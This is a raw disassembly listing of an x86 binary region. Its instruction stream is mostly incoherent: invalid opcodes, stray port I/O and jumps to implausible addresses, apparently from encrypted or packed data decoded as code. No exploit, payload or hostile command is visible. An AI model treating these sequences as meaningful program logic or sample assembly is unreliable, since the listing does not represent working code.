  42a948:	ds push eax
  42a94a:	and    al,0xca
  42a94c:	push   cs
  42a94d:	pop    ss
  42a94e:	in     al,dx
  42a94f:	(bad)  
  42a950:	loop   0x42a957
  42a952:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a953:	sbb    esp,ecx
  42a955:	mov    DWORD PTR [ecx+0x3c7010f0],eax
  42a95b:	or     BYTE PTR [edi+0xdf6a114],cl
  42a961:	jo     0x42a970
  42a963:	out    0xb6,al
  42a965:	push   edx
  42a966:	mov    ds:0x7dd668b2,al
  42a96b:	push   ss
  42a96c:	pop    ds
  42a96d:	xchg   ecx,eax
  42a96e:	arpl   WORD PTR [ebp+edi*1-0x23],dx
  42a972:	or     dl,BYTE PTR [esi-0x6d7d6279]
  42a978:	fiadd  WORD PTR [esp+edx*8+0x766a6ddf]
  42a97f:	jge    0x42a93f
  42a981:	sar    ebp,0x33
  42a984:	fnstsw WORD PTR [ebx]
  42a986:	scas   al,BYTE PTR es:[edi]
  42a987:	arpl   WORD PTR [ebp-0x3d],si
  42a98a:	fdiv   QWORD PTR [eax+eiz*2-0x21]
  42a98e:	(bad)  
  42a98f:	stc    
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	ficomp WORD PTR [ebx]
  42aa02:	cmp    ah,BYTE PTR es:[edi+eax*8+0x1040001]
  42aa0a:	add    BYTE PTR [eax],al
  42aa0c:	inc    edx
  42aa0d:	push   ebx
  42aa0e:	ins    DWORD PTR es:[edi],dx
  42aa0f:	xchg   edx,eax
  42aa10:	pop    esi
  42aa11:	iret   
  42aa12:	je     0x42aa85
  42aa14:	jne    0x42a9e5
  42aa16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa17:	sbb    eax,0x186a9798
  42aa1c:	pop    esi
  42aa1d:	rol    BYTE PTR [esi],0xde
  42aa20:	mov    ds:0x10de432b,eax
  42aa25:	xor    al,0x1
  42aa27:	push   es
  42aa28:	rcl    bl,0xb0
  42aa2b:	ror    DWORD PTR [eax+ebx*2+0x5ea10bf4],1
  42aa32:	xchg   edi,eax
  42aa33:	idiv   DWORD PTR [ebx+0x7c73ad58]
  42aa39:	pop    eax
  42aa3a:	sub    eax,0x8acf014d
  42aa3f:	mov    eax,ds:0x2199268e
  42aa44:	jns    0x42aa5e
  42aa46:	gs dec edx
  42aa48:	adc    esi,ebp
  42aa4a:	pop    es
  42aa4b:	idiv   DWORD PTR [ebp-0x1]
  42aa4e:	out    0x38,al
  42aa50:	in     al,dx
  42aa51:	daa    
  42aa52:	inc    edx
  42aa53:	in     al,dx
  42aa54:	push   es
  42aa55:	retf   
  42aa56:	xchg   edi,eax
  42aa57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa58:	aaa    
  42aa59:	inc    edi
  42aa5a:	loop   0x42aa47
  42aa5c:	retf   0x621a
  42aa5f:	rol    DWORD PTR ds:0xe1748f9d,0x73
  42aa66:	jbe    0x42aad4
  42aa68:	in     al,0x59
  42aa6a:	sub    esp,DWORD PTR [ebx+eiz*1]
  42aa6d:	cwde   
  42aa6e:	mov    esi,0x3013e5ab
  42aa73:	add    al,0xe4
  42aa75:	add    eax,DWORD PTR [esi]
  42aa77:	xchg   ebp,eax
  42aa78:	adc    al,BYTE PTR [ebp-0x33]
  42aa7b:	xchg   edi,eax
  42aa7c:	je     0x42aa3d
  42aa7e:	mov    ds:0x236a6129,eax
  42aa83:	clc    
  42aa84:	lock loope 0x42aaf1
  42aa87:	cmp    BYTE PTR [edi],ch
  42aa89:	pop    ebx
  42aa8a:	imul   ecx,ebp,0xa042c5d0
  42aa90:	adc    eax,0x93e7d4a8
  42aa95:	gs pop esp
  42aa97:	dec    BYTE PTR [eax]
  42aa99:	int3   
  42aa9a:	jg     0x42aacb
  42aa9c:	ret    0x4b1b
  42aa9f:	sbb    eax,DWORD PTR [ebp+0x3d]
  42aaa2:	fcmovbe st,st(7)
  42aaa4:	aas    
  42aaa5:	sub    BYTE PTR [ebx],cl
  42aaa7:	or     ecx,DWORD PTR [edi-0x28a2cff]
  42aaad:	mov    ds:0x224169c9,eax
  42aab2:	cmp    eax,0x1f5715a4
  42aab7:	loop   0x42aacc
  42aab9:	ja     0x42aa6e
  42aabb:	or     BYTE PTR [edi],cl
  42aabd:	jl     0x42aaeb
  42aabf:	test   DWORD PTR [edx-0x66b06beb],edx
  42aac5:	sbb    al,0xa3
  42aac7:	inc    edx
  42aac8:	(bad)  
  42aac9:	xor    BYTE PTR [ecx+0x3aa58e1f],ah
  42aacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aad0:	retf   
  42aad1:	test   ecx,esi
  42aad3:	cmp    al,0x78
  42aad5:	adc    BYTE PTR [eax-0x28],ch
  42aad8:	pusha  
  42aad9:	dec    esi
  42aada:	mov    al,ds:0x233f3846
  42aadf:	rol    edi,1
  42aae1:	jae    0x42aaf1
  42aae3:	push   ebx
  42aae4:	popa   
  42aae5:	dec    ax
  42aae7:	(bad)
  42aaec:	jb     0x42ab5b
  42aaee:	xchg   edi,eax
  42aaef:	and    al,0xb5
  42aaf1:	sbb    bh,ch
  42aaf3:	rcl    BYTE PTR [edx-0x3657fe45],0xbf
  42aafa:	push   ss
  42aafb:	nop
  42aafc:	and    ebx,DWORD PTR [ebx+0x6c]
  42aaff:	adc    bh,BYTE PTR [esi]
  42ab01:	or     eax,0x69f5e2c
  42ab06:	push   edx
  42ab07:	(bad)  
  42ab08:	push   ecx
  42ab09:	(bad)  
  42ab0a:	sti    
  42ab0b:	das    
  42ab0c:	jl     0x42ab7d
  42ab0e:	fsub   DWORD PTR [ebx+0x0]
	...
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	rcr    DWORD PTR [eax+0x6e],0xa5
  42ab84:	test   al,0xc8
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	test   edx,ebp
  42ab8e:	jne    0x42abb9
  42ab90:	rcr    BYTE PTR [edi+0x71],1
  42ab93:	xchg   ebx,eax
  42ab94:	dec    edx
  42ab95:	lds    edi,FWORD PTR [eax]
  42ab97:	or     edi,DWORD PTR [edi-0x28]
  42ab9a:	cmp    ebp,DWORD PTR [edi]
  42ab9c:	sub    bl,dh
  42ab9e:	aam    0x41
  42aba0:	jle    0x42ab41
  42aba2:	fcmovnu st,st(6)
  42aba4:	fist   WORD PTR [esi-0x5e]
  42aba7:	or     eax,0x8518503c
  42abac:	sbb    eax,0x85703c80
  42abb1:	sub    bl,BYTE PTR [edi]
  42abb3:	lods   eax,DWORD PTR ds:[esi]
  42abb4:	shr    DWORD PTR [ebp+0x2e8c4893],0x7b
  42abbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abbc:	dec    ecx
  42abbd:	out    dx,al
  42abbe:	lock jle 0x42ac0f
  42abc1:	dec    edx
  42abc2:	into   
  42abc3:	sar    DWORD PTR ds:0x87a1bac3,0xb4
  42abca:	push   edx
  42abcb:	mov    ecx,0xad4beb7
  42abd0:	pop    edi
  42abd1:	fisub  WORD PTR [esi+0x76a4e629]
  42abd7:	mov    BYTE PTR [ebp+0x107161db],cl
  42abdd:	je     0x42abbb
  42abdf:	push   esi
  42abe0:	loopne 0x42ab6b
  42abe2:	mov    cl,0xc
  42abe4:	pop    eax
  42abe5:	fld    QWORD PTR [ecx+0x74]
  42abe8:	jmp    0x42ab89
  42abea:	pop    edx
  42abeb:	aas    
  42abec:	mov    esi,0x811d334e
  42abf1:	out    dx,al
  42abf2:	jmp    0x42ac58
  42abf4:	xor    DWORD PTR [esi-0x7d],esi
  42abf7:	aam    0xd4
  42abf9:	je     0x42abcb
  42abfb:	data16 jl 0x42abc4
  42abfe:	dec    esp
  42abff:	pop    ss
  42ac00:	imul   ebx,DWORD PTR [ebx+0x790176b7],0x2e9e29e0
  42ac0a:	repnz int 0x6c
  42ac0d:	sub    eax,0x3ec4e5d6
  42ac12:	mov    BYTE PTR [esi-0x550bdff1],ah
  42ac18:	sub    BYTE PTR [eax+esi*2+0x6a217bcd],dh
  42ac1f:	sahf   
  42ac20:	mov    eax,ds:0xb6da2328
  42ac25:	jo     0x42ac73
  42ac27:	data16 inc BYTE PTR ds:0xdda4b4ef
  42ac2e:	or     DWORD PTR [edi+0x70],esp
  42ac31:	and    bh,BYTE PTR [eax+0x80e9e32]
  42ac37:	add    dl,ch
  42ac39:	inc    ebp
  42ac3a:	test   DWORD PTR [eax-0x4b534589],ebx
  42ac40:	jg     0x42abfa
  42ac42:	add    edi,DWORD PTR [ecx+0x2d]
  42ac45:	xchg   ebp,eax
  42ac46:	mov    ebp,0x7e503253
  42ac4b:	lea    esp,es:[ecx+0x48]
  42ac4f:	out    dx,eax
  42ac50:	pop    esi
  42ac51:	push   es
  42ac52:	push   cs
  42ac53:	mov    ds:0x37515b67,eax
  42ac58:	xchg   esp,eax
  42ac59:	stc    
  42ac5a:	or     al,0xa8
  42ac5c:	sar    BYTE PTR [ebx-0x7980c792],0xae
  42ac63:	gs xchg ecx,eax
  42ac65:	sti    
  42ac66:	fisttp WORD PTR [edi-0x45]
  42ac69:	sub    eax,0xcbcd6288
  42ac6e:	cmp    dh,BYTE PTR ds:0x7a379ec1
  42ac74:	adc    dh,BYTE PTR [esi+eax*2]
  42ac77:	out    0x53,eax
  42ac79:	cld    
  42ac7a:	out    dx,al
  42ac7b:	inc    edi
  42ac7c:	inc    esp
  42ac7d:	imul   eax,ecx,0xfffffffd
  42ac80:	push   ecx
  42ac81:	(bad)  [edi+0x5]
  42ac84:	mov    ds:0x6d6aec43,al
  42ac89:	pop    edx
  42ac8a:	loopne 0x42acc5
  42ac8c:	push   es
  42ac8d:	dec    ebp
  42ac8e:	fmulp  st(0),st
	...
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	aam    0xd3
  42ad02:	jecxz  0x42ace5
  42ad04:	lods   al,BYTE PTR ds:[esi]
  42ad05:	leave  
  42ad06:	add    DWORD PTR [eax],eax
  42ad08:	add    al,0x1
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	sti    
  42ad0d:	sub    eax,0xccea2c0d
  42ad12:	fsubr  DWORD PTR [edx]
  42ad14:	fistp  WORD PTR [ebp-0x69975222]
  42ad1a:	cmp    al,0xb0
  42ad1c:	add    eax,DWORD PTR [ebp-0x1aaaf578]
  42ad22:	xor    dl,BYTE PTR [ebp+0x3dbb80f4]
  42ad28:	or     dl,dh
  42ad2a:	add    eax,0x41a5c101
  42ad2f:	or     edi,esp
  42ad31:	push   eax
  42ad32:	xchg   edi,eax
  42ad33:	dec    edi
  42ad34:	push   ebp
  42ad35:	out    dx,al
  42ad36:	loop   0x42ad17
  42ad38:	cmp    al,0xa8
  42ad3a:	je     0x42ad5c
  42ad3c:	(bad)  
  42ad3e:	test   eax,0x79463b18
  42ad43:	dec    ebp
  42ad44:	jl     0x42adb8
  42ad46:	mov    edi,0xde81c013
  42ad4b:	xor    esp,eax
  42ad4d:	std    
  42ad4e:	gs stc 
  42ad50:	push   edi
  42ad51:	inc    esp
  42ad52:	or     BYTE PTR [edx+0x35],cl
  42ad55:	psrad  mm3,QWORD PTR [esi]
  42ad58:	and    eax,0xcb0dc11f
  42ad5d:	sub    BYTE PTR [ecx-0x7e],al
  42ad60:	enter  0xa3a9,0x73
  42ad64:	jle    0x42adaf
  42ad66:	fucomp st(0)
  42ad68:	sub    al,0xae
  42ad6a:	punpckhbw mm3,QWORD PTR [esp+esi*2-0x371eaf22]
  42ad72:	sbb    al,0xe5
  42ad74:	scas   al,BYTE PTR es:[edi]
  42ad75:	ds pop esi
  42ad77:	popf   
  42ad78:	popf   
  42ad79:	pop    esp
  42ad7a:	jg     0x42ad23
  42ad7c:	popa   
  42ad7d:	cmp    al,0x35
  42ad7f:	jge    0x42ad9e
  42ad81:	push   esi
  42ad82:	sbb    DWORD PTR [edi+0x2],esp
  42ad85:	in     al,0xf2
  42ad87:	ins    BYTE PTR es:[edi],dx
  42ad88:	or     BYTE PTR [eax+eax*2-0x61],bh
  42ad8c:	mov    esi,0x2f1352cd
  42ad91:	mov    bh,0x8c
  42ad93:	not    BYTE PTR [eax-0x2f07ffc1]
  42ad99:	lds    ebx,FWORD PTR [edi-0x864904]
  42ad9f:	jmp    0x42ad9f
  42ada1:	jae    0x42ad67
  42ada3:	inc    esi
  42ada4:	in     eax,0x29
  42ada6:	xchg   ebp,eax
  42ada7:	repnz adc ecx,eax
  42adaa:	sub    BYTE PTR [ebx+esi*4-0x2f],bl
  42adae:	fisub  DWORD PTR [ebp-0x22]
  42adb1:	sbb    BYTE PTR [edx],dl
  42adb3:	lods   eax,DWORD PTR ds:[esi]
  42adb4:	call   0x648fdb6
  42adb9:	pop    edx
  42adba:	js     0x42ad88
  42adbc:	xchg   ebx,eax
  42adbd:	add    eax,0x4bb12f84
  42adc2:	jno    0x42ade6
  42adc4:	sub    BYTE PTR [ebp+0xa],ah
  42adc7:	hlt    
  42adc8:	or     al,0xfb
  42adca:	test   BYTE PTR [ecx+0x67],0x52
  42adce:	adc    al,0xd2
  42add0:	and    al,0x85
  42add2:	mov    ebx,0x8557f659
  42add7:	add    ebp,eax
  42add9:	icebp  
  42adda:	int3   
  42addb:	jb     0x42ae27
  42addd:	xor    DWORD PTR [ebx-0x19],esp
  42ade0:	out    dx,al
  42ade1:	cs pop ebp
  42ade3:	add    eax,0xd0727996
  42ade8:	mov    dh,BYTE PTR [eax-0x2395ad74]
  42adee:	not    DWORD PTR [eax+0x31]
  42adf1:	daa    
  42adf2:	fdivr  QWORD PTR [ecx-0x18]
  42adf5:	adc    eax,0x3d81def2
  42adfa:	xor    bl,BYTE PTR [esp+edi*8-0x3a]
  42adfe:	lods   al,BYTE PTR ds:[esi]
  42adff:	setnp  BYTE PTR [edx-0x7b]
  42ae03:	pop    eax
  42ae04:	or     ah,BYTE PTR [ebx]
  42ae06:	xchg   esi,eax
  42ae07:	pop    edi
  42ae08:	aaa    
  42ae09:	ins    DWORD PTR es:[edi],dx
  42ae0a:	retf   
  42ae0b:	mov    ah,0xde
  42ae0d:	ja     0x42ada4
  42ae0f:	call   0x0:0x0
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	pusha  
  42ae81:	inc    esp
  42ae82:	jle    0x42ae40
  42ae84:	mov    al,0xca
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae8d:	inc    esp
  42ae8e:	lahf   
  42ae8f:	rol    DWORD PTR [esi+eiz*8-0x77],0x43
  42ae94:	es loope 0x42ae49
  42ae97:	mov    ds:0xa6b60574,eax
  42ae9c:	mov    ah,0x29
  42ae9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae9f:	push   edi
  42aea0:	and    BYTE PTR [ebx+0x68],bl
  42aea3:	sahf   
  42aea4:	lock jp 0x42aedd
  42aea7:	ror    DWORD PTR [ebp-0x4c5ed106],1
  42aead:	dec    ecx
  42aeae:	cmp    eax,0x7236b73b
  42aeb3:	add    edx,DWORD PTR ds:0xa49b11d9
  42aeb9:	call   0xce72:0xfe0bff49
  42aec0:	mov    bl,0xfa
  42aec2:	pusha  
  42aec3:	mov    DWORD PTR [ecx-0x7c45838],ebp
  42aec9:	dec    ebp
  42aeca:	fdivr  DWORD PTR [esi-0x363fbac8]
  42aed0:	nop    ebp
  42aed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aed4:	inc    eax
  42aed5:	addr16 xchg edi,eax
  42aed7:	push   cs
  42aed8:	or     eax,0x5b4f57ab
  42aedd:	out    0x2e,eax
  42aedf:	push   eax
  42aee0:	inc    eax
  42aee1:	in     al,dx
  42aee2:	pop    ecx
  42aee3:	repnz xor BYTE PTR ds:0x6f7c8b5f,bh
  42aeea:	js     0x42af04
  42aeec:	call   DWORD PTR ds:0x624e5f90
  42aef2:	adc    edx,DWORD PTR [edi+0x3a]
  42aef5:	cmp    BYTE PTR [ebp+0x6d],ch
  42aef8:	(bad)  
  42aef9:	xchg   edi,eax
  42aefa:	dec    ecx
  42aefb:	add    BYTE PTR [eax],al
  42aefd:	js     0x42af4a
  42aeff:	lods   al,BYTE PTR ds:[esi]
  42af00:	adc    DWORD PTR [edi],esi
  42af02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af03:	pop    eax
  42af04:	adc    BYTE PTR [edx],bl
  42af06:	in     eax,dx
  42af07:	push   es
  42af08:	pop    edi
  42af09:	out    dx,al
  42af0a:	es ins DWORD PTR es:[edi],dx
  42af0c:	add    edx,esp
  42af0e:	mov    cl,0x51
  42af10:	jb     0x42af7c
  42af12:	push   esi
  42af13:	sti    
  42af14:	aas    
  42af15:	push   esi
  42af16:	sbb    dl,al
  42af18:	jbe    0x42af26
  42af1a:	clc    
  42af1b:	fsub   DWORD PTR [ecx+0x590a03d5]
  42af21:	dec    ebx
  42af22:	add    ah,BYTE PTR [ebx+0x2d5a8d8a]
  42af28:	mov    dh,BYTE PTR [ebx]
  42af2a:	jo     0x42aefa
  42af2c:	dec    esp
  42af2d:	loope  0x42aeee
  42af2f:	hlt    
  42af30:	frstor [esi]
  42af32:	mov    es:0x4a7ccb7d,eax
  42af38:	hlt    
  42af39:	lods   eax,DWORD PTR ds:[esi]
  42af3a:	sar    DWORD PTR [eax+0x3275389a],0xfa
  42af41:	mov    WORD PTR [edi+0x5d3c6a93],es
  42af47:	and    DWORD PTR [eax],0xbc046183
  42af4d:	clc    
  42af4e:	(bad)  
  42af4f:	sub    dl,BYTE PTR [edx+0x66]
  42af52:	retfw  
  42af54:	mov    cl,0x25
  42af56:	fdivr  DWORD PTR [esi]
  42af58:	retf   0xa053
  42af5b:	(bad)  
  42af5c:	mov    edi,0x22b03daf
  42af61:	mov    ah,BYTE PTR [ecx-0x3d67deaf]
  42af67:	sbb    ah,dl
  42af69:	test   DWORD PTR [eax-0x42],eax
  42af6c:	aad    0x1e
  42af6e:	dec    edx
  42af6f:	sub    DWORD PTR [ebp-0x3324ac7d],edx
  42af75:	mov    ebp,0x83dca27e
  42af7a:	cmp    DWORD PTR [ecx],0x9676d4b
  42af80:	outs   dx,DWORD PTR ds:[esi]
  42af81:	sub    BYTE PTR [edx-0x68],ah
  42af84:	pop    ds
  42af85:	inc    ebx
  42af86:	adc    DWORD PTR [edi-0x24c30e75],ebp
  42af8c:	pop    esp
  42af8d:	sub    al,0x72
  42af8f:	add    DWORD PTR [eax],0x0
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	dec    edi
  42b001:	jno    0x42b040
  42b003:	mov    cl,0xb4
  42b005:	retf   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	jmp    0xf28c8102
  42b011:	or     bl,BYTE PTR ds:0x2a1fe5
  42b017:	inc    ebp
  42b018:	fcom   DWORD PTR [ebx-0x453fc0f6]
  42b01e:	test   al,0xde
  42b020:	adc    bl,BYTE PTR [esi+esi*4-0x58]
  42b024:	rol    BYTE PTR [edx+0x146db1a],1
  42b02a:	xor    dh,bh
  42b02c:	xor    eax,0x4fa75fea
  42b031:	xlat   BYTE PTR ds:[ebx]
  42b032:	pop    edx
  42b033:	aad    0x9
  42b035:	in     eax,0x39
  42b037:	sub    esp,DWORD PTR [edx-0xe]
  42b03a:	cld    
  42b03b:	js     0x42b05c
  42b03d:	ja     0x42b0b0
  42b03f:	add    cl,BYTE PTR [edi-0x44]
  42b042:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b043:	ret    
  42b044:	fsubp  st(6),st
  42b046:	xor    BYTE PTR ds:0xe8f0e58a,ch
  42b04c:	mov    al,0x96
  42b04e:	mov    dl,0xb8
  42b050:	mov    dl,0x27
  42b052:	adc    esi,DWORD PTR [eax]
  42b054:	es call 0xc8b5:0x59055193
  42b05c:	cmp    DWORD PTR [ebp+0x3],edx
  42b05f:	lea    esp,[eax+0xf842069]
  42b065:	lds    ebp,FWORD PTR [ebx+ebp*4]
  42b068:	shr    eax,cl
  42b06a:	sahf   
  42b06b:	sub    esp,ebp
  42b06d:	push   0xca73dde9
  42b072:	loope  0x42b0e3
  42b074:	adc    esi,DWORD PTR [ebp-0x18]
  42b077:	imul   esi,DWORD PTR [ebx+0x14],0x831d2a8b
  42b07e:	sub    DWORD PTR [ebx],0x28
  42b081:	dec    ebx
  42b082:	(bad)  
  42b084:	or     eax,DWORD PTR [ecx-0x390018d1]
  42b08a:	push   ds
  42b08b:	xor    al,0x1e
  42b08d:	jmp    0x5ff4c310
  42b092:	push   ebx
  42b093:	fidiv  DWORD PTR [eax]
  42b095:	jb     0x42b0ad
  42b097:	sbb    BYTE PTR [eax+0x6b],0x4a
  42b09b:	jmp    0x19db810b
  42b0a0:	mov    bl,0x73
  42b0a2:	push   eax
  42b0a3:	pushf  
  42b0a4:	xchg   edx,eax
  42b0a5:	(bad)  
  42b0a6:	jmp    0xaf164cdb
  42b0ab:	xchg   ebp,eax
  42b0ac:	push   0x52
  42b0ae:	test   ebx,ebp
  42b0b0:	cmp    ch,BYTE PTR [ebp-0x2]
  42b0b3:	xchg   edx,eax
  42b0b4:	outs   dx,BYTE PTR ds:[esi]
  42b0b5:	inc    eax
  42b0b6:	xchg   ebx,eax
  42b0b7:	push   ebp
  42b0b8:	mov    ecx,0x7d7f1f92
  42b0bd:	sbb    edx,DWORD PTR [edx-0x4ab850fb]
  42b0c3:	fmul   DWORD PTR [eax+0x28995aae]
  42b0c9:	adc    edi,DWORD PTR [esi+edx*1+0x70e60ec5]
  42b0d0:	mov    ah,0xcf
  42b0d2:	inc    eax
  42b0d3:	(bad)  
  42b0d4:	adc    al,0xed
  42b0d6:	jnp    0x42b115
  42b0d8:	cli    
  42b0d9:	ins    DWORD PTR es:[edi],dx
  42b0da:	inc    esp
  42b0db:	mov    al,0x33
  42b0dd:	push   0xd814ec3b
  42b0e2:	gs xchg esi,eax
  42b0e4:	add    al,bl
  42b0e6:	je     0x42b0d3
  42b0e8:	arpl   WORD PTR [eax-0x6b3e42e6],cx
  42b0ee:	fucomp st(6)
  42b0f0:	jnp    0x42b0be
  42b0f2:	fs push ds
  42b0f4:	les    esp,FWORD PTR [ecx]
  42b0f6:	dec    ebx
  42b0f7:	xlat   BYTE PTR ds:[ebx]
  42b0f8:	popf   
  42b0f9:	mov    eax,0x4cbaafc7
  42b0fe:	xchg   esi,eax
  42b0ff:	fisub  DWORD PTR [ecx]
  42b101:	dec    edx
  42b102:	push   eax
  42b103:	pop    edx
  42b104:	pop    edi
  42b105:	shl    DWORD PTR [esi],cl
  42b107:	leave  
  42b108:	cmp    eax,0xa4a074f
  42b10d:	dec    ebp
  42b10e:	sar    DWORD PTR [esi+0x0],cl
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	rcr    BYTE PTR [eax+esi*1+0x1ccb886],1
  42b187:	add    BYTE PTR [ecx+eax*1],al
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	mov    esi,0x66b10b2c
  42b191:	sbb    al,0xde
  42b193:	rol    eax,1
  42b195:	into   
  42b196:	pusha  
  42b197:	cmp    eax,DWORD PTR [ebx-0x7c]
  42b19a:	(bad)
  42b19d:	gs popa 
  42b19f:	(bad)  
  42b1a0:	dec    ebp
  42b1a1:	cmp    ebx,DWORD PTR [edi+0xd]
  42b1a4:	push   es
  42b1a5:	bound  esi,QWORD PTR [eax+0x67a20813]
  42b1ab:	xchg   ebx,eax
  42b1ac:	fisub  WORD PTR [ebx+0x50]
  42b1af:	clc    
  42b1b0:	(bad)  
  42b1b1:	nop
  42b1b2:	lods   eax,DWORD PTR ds:[esi]
  42b1b3:	fld    TBYTE PTR [ebp-0x1c]
  42b1b6:	pop    eax
  42b1b7:	sub    eax,0xdd801306
  42b1bc:	in     al,0xe0
  42b1be:	arpl   WORD PTR [ecx-0x11],ax
  42b1c1:	adc    DWORD PTR [eax+0x11],edi
  42b1c4:	mov    dl,0xc2
  42b1c6:	cmp    eax,0x8b598def
  42b1cb:	push   eax
  42b1cc:	cmp    DWORD PTR [edx+0x49],esp
  42b1cf:	mov    eax,0x23e2ffcb
  42b1d4:	pop    es
  42b1d5:	dec    edx
  42b1d6:	and    DWORD PTR [esi],0x48
  42b1d9:	pop    esp
  42b1da:	sbb    DWORD PTR [esi+0x5a4d3fb7],edi
  42b1e0:	jns    0x42b1de
  42b1e2:	mov    ?,WORD PTR [edx+esi*8-0x6d717b7b]
  42b1e9:	retf   0xb8f6
  42b1ec:	and    eax,0xa93302c1
  42b1f1:	and    BYTE PTR [edi-0x6d],0xc3
  42b1f5:	add    ch,BYTE PTR [edi+0x42]
  42b1f8:	(bad)  
  42b1f9:	test   DWORD PTR [ecx+0x6171fc6a],0xd43521fb
  42b203:	loop   0x42b1c9
  42b205:	into   
  42b206:	jge    0x42b251
  42b208:	lods   eax,DWORD PTR ds:[esi]
  42b209:	pushf  
  42b20a:	sub    al,BYTE PTR [esi-0x2c40e8a]
  42b210:	mov    cs:0x59fd91a7,al
  42b216:	dec    esi
  42b217:	retf   
  42b218:	jge    0x42b1c5
  42b21a:	inc    edx
  42b21b:	cmp    eax,0xf310b109
  42b220:	jbe    0x42b1b4
  42b222:	and    eax,0x4f9467c5
  42b227:	push   0xffffffd6
  42b229:	lods   eax,DWORD PTR ds:[esi]
  42b22a:	sub    eax,DWORD PTR [esi]
  42b22c:	dec    esi
  42b22d:	(bad)  
  42b22e:	icebp  
  42b22f:	mov    ah,0x86
  42b231:	lock jecxz 0x42b27a
  42b234:	adc    dh,dl
  42b236:	test   BYTE PTR [edx-0x1],cl
  42b239:	pcmpgtd mm5,mm0
  42b23c:	and    BYTE PTR [ebx+0xe],dh
  42b23f:	add    al,0xe9
  42b241:	and    bh,dl
  42b243:	sbb    al,0x54
  42b245:	mov    ebp,0x8c533126
  42b24a:	adc    eax,0x9c20d6e6
  42b24f:	sub    BYTE PTR [eax+0x7b976b9c],0x33
  42b256:	jmp    0x42b21a
  42b258:	cmp    ebp,DWORD PTR [eax+0x691fc5aa]
  42b25e:	dec    ecx
  42b25f:	xor    eax,0xbf468518
  42b264:	mov    ebx,0x842e5db2
  42b269:	imul   ebp,DWORD PTR [ebx+0x6759b5a4],0x63
  42b270:	in     eax,0x3c
  42b272:	sar    BYTE PTR [edi],1
  42b274:	adc    DWORD PTR [ecx-0x3911a2d6],esp
  42b27a:	sbb    BYTE PTR [ebx],ah
  42b27c:	ds dec ebp
  42b27e:	ins    BYTE PTR es:[edi],dx
  42b27f:	push   0xffffffbc
  42b281:	ret    
  42b282:	retf   
  42b283:	add    dh,BYTE PTR [ecx]
  42b285:	neg    BYTE PTR [eax+0x6c]
  42b288:	inc    ecx
  42b289:	mov    edx,0x9793fc3a
  42b28e:	call   0x42b34c
	...
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0xdb738e65
  42b301:	push   0x55
  42b303:	sbb    al,0xbc
  42b305:	int    0x1
  42b307:	add    BYTE PTR [ecx+eax*1],al
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	mov    dl,0x56
  42b30e:	fwait
  42b30f:	in     eax,0xdc
  42b311:	pop    ds
  42b312:	jmp    DWORD PTR [ebp-0x66413a43]
  42b318:	add    al,0x4a
  42b31a:	icebp  
  42b31b:	add    esi,ebp
  42b31d:	rcl    BYTE PTR [edi-0xc],0xfe
  42b321:	mov    ecx,0xb9169cd3
  42b326:	fmul   QWORD PTR [ebx]
  42b328:	inc    edx
  42b329:	stc    
  42b32a:	and    eax,0x33630754
  42b32f:	xchg   ecx,eax
  42b330:	xor    BYTE PTR [eax+0x5f],ah
  42b333:	int    0x46
  42b335:	iret   
  42b336:	shl    BYTE PTR [edi],cl
  42b338:	jmp    0x42b368
  42b33a:	push   ecx
  42b33b:	leave  
  42b33c:	sub    eax,0x2f1728ad
  42b341:	or     al,0x33
  42b343:	adc    dh,BYTE PTR [ebp+ecx*4+0x72e412f]
  42b34a:	lods   al,BYTE PTR ds:[esi]
  42b34b:	dec    esi
  42b34c:	in     eax,dx
  42b34d:	sbb    ebp,DWORD PTR [edi+ebx*8]
  42b350:	test   DWORD PTR [ebp-0x3844088e],0x49e0e81d
  42b35a:	or     edx,DWORD PTR [ecx-0x1df07d7d]
  42b360:	test   DWORD PTR ds:0x4ecee1c9,esi
  42b366:	pop    eax
  42b367:	call   0x3a1bf194
  42b36c:	scas   eax,DWORD PTR es:[edi]
  42b36d:	cmp    BYTE PTR [edx-0x56],ah
  42b370:	es adc ah,bl
